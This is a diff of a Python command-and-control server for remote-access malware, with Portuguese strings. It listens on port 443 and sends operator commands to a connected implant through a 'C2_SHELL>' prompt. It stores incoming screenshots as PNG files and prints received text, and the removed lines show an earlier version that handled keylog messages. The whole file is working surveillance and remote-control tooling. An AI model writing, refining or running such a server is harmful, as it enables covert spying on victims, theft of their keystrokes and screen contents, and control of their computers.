@@ -1,41 +1,52 @@
 import socket
 import sys
+import struct
 import threading
-import protocolo
 
 LISTEN_IP = "0.0.0.0"
 PORT = 443
-SOCKET_TIMEOUT = 1.0
+
+def receber_bytes_exatos(client_socket, tamanho_esperado):
+    dados_acumulados = b""
+    while len(dados_acumulados) < tamanho_esperado:
+        bytes_restantes = tamanho_esperado - len(dados_acumulados)
+        pacote = client_socket.recv(bytes_restantes)
+        if not pacote:
+            raise ConnectionResetError("Conexão fechada pelo cliente.")
+        dados_acumulados += pacote
+    return dados_acumulados
+
+def ler_mensagem_do_protocolo(client_socket):
+    bytes_do_tamanho = receber_bytes_exatos(client_socket, 4)
+    tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
+    payload_bruto = receber_bytes_exatos(client_socket, tamanho_do_payload)
+    return payload_bruto
 
 def receive_handler(client_socket):
     while True:
         try:
-            tipo, payload = protocolo.ler_mensagem(client_socket)
+            payload = ler_mensagem_do_protocolo(client_socket)
             
-            if tipo == protocolo.MSG_TEXTO:
-                print(f"\n[Texto]: {payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
-                
-            elif tipo == protocolo.MSG_KEYLOG:
-                print(f"\n[Keylog]:\n{payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
-                
-            elif tipo == protocolo.MSG_IMAGEM:
+            if payload.startswith(b'\x89PNG\r\n\x1a\n'):
                 nome_arquivo = f"screenshot_{threading.get_ident()}.png"
                 with open(nome_arquivo, "wb") as f:
                     f.write(payload)
-                print(f"\n[+] Imagem salva intacta: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
+                print(f"\n[+] Imagem salva: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
+            else:
+                texto_recebido = payload.decode("utf-8", errors="replace")
+                print(f"\n{texto_recebido}\nC2_SHELL> ", end="", flush=True)
                 
         except socket.timeout:
             continue
-        except RuntimeError as e:
-            print(f"\n[-] Erro estrutural no fluxo de bytes: {e}")
+        except ConnectionResetError as e_reset:
+            print(f"\n[-] Conexão resetada: {e_reset}")
             break
-        except OSError as e:
-            print(f"\n[-] Erro de E/S no socket do cliente: {e}")
+        except struct.error as e_struct:
+            print(f"\n[!] Erro estrutural nos dados do cabeçalho: {e_struct}")
             break
-        except Exception as e:
-            print(f"\n[!] Exceção inesperada interna da thread: {type(e).__name__} -> {e}")
+        except OSError as e_os:
+            print(f"\n[-] Erro de E/S no socket: {e_os}")
             break
-    print("\n[*] Encerrando thread de recepção de dados.")
 
 def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -44,16 +55,16 @@ def start_server():
     try:
         server.bind((LISTEN_IP, PORT))
         server.listen(1)
-        print(f"[*] Escutando em {LISTEN_IP}:{PORT}...")
-    except OSError as e:
-        print(f"[!] Erro ao realizar o bind na porta {PORT}: {e}")
+        print(f"[*] Listening on {LISTEN_IP}:{PORT}...")
+    except OSError as e_bind:
+        print(f"[!] Erro no bind na porta {PORT}: {e_bind}")
         sys.exit(1)
         
     try:
         client_socket, client_address = server.accept()
-        print(f"[+] Conexão aceita originada de {client_address[0]}:{client_address[1]}")
+        print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
         
-        client_socket.settimeout(SOCKET_TIMEOUT)
+        client_socket.settimeout(1.0)
         
         recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
         recv_thread.start()
@@ -64,21 +75,18 @@ def start_server():
                 if not command:
                     continue
                     
-                protocolo.enviar_mensagem(client_socket, protocolo.MSG_TEXTO, command.encode('utf-8'))
+                cabecalho = struct.pack(">I", len(command.encode("utf-8")))
+                client_socket.sendall(cabecalho + command.encode("utf-8"))
                 
                 if command == "/exit":
-                    print("[*] Encerrando sessão por comando do operador.")
+                    print("[*] Closing connection.")
                     break
             except KeyboardInterrupt:
                 break
-            except OSError as e:
-                print(f"[-] Erro ao enviar comando para o cliente: {e}")
+            except OSError as e_envio:
+                print(f"[-] Erro de envio: {e_envio}")
                 break
                     
-    except KeyboardInterrupt:
-        print("\n[*] Interrupção detectada. Finalizando servidor...")
-    except Exception as e:
-        print(f"\n[!] Falha grave no loop principal do servidor: {type(e).__name__} -> {e}")
     finally:
         server.close()
 
